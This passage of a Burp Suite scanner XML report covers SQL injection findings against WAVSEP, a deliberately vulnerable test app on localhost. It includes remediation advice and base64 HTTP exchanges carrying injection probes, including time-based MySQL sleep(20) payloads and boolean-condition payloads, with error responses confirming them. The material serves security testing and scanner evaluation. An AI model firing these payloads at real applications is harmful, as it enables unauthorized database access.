xpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjEwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClNldmVyYWwgYWNjb3VudHMgbWF0Y2ggdGhlIGNyaXRlcmlhLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxNzcwNTc0MTAlMjBvciUyMDkyNjYlM2QwOTI2Ng==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDc5Nw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0OTozMCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTEV4Y2VwdGlvbjogSW5jb3JyZWN0IERBVEUgdmFsdWU6ICYjMzk7MjAxMC0wMS0wMTc3MDU3NDEwIG9yIDkyNjY9MDkyNjYmIzM5OzwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYic=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjMwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzQNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCk5vIE1hdGNoLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1207302329644644352</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the transactionDate parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTQtSW5qZWN0aW9uSW5VcGRhdGUtRGF0ZS1Db21tYW5kSW5qZWN0aW9uLVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDItMDIn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkyMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0ODoxMSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsyMDEwLTAyLTAyJiMzOTsmIzM5OyYjMzk7IGF0IGxpbmUgMTwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTQtSW5qZWN0aW9uSW5VcGRhdGUtRGF0ZS1Db21tYW5kSW5qZWN0aW9uLVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDItMDInJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKUXVlcnkgZXhlY3V0ZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTQtSW5qZWN0aW9uSW5VcGRhdGUtRGF0ZS1Db21tYW5kSW5qZWN0aW9uLVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDItMDInJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjMyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKUXVlcnkgZXhlY3V0ZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5838292336887613440</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
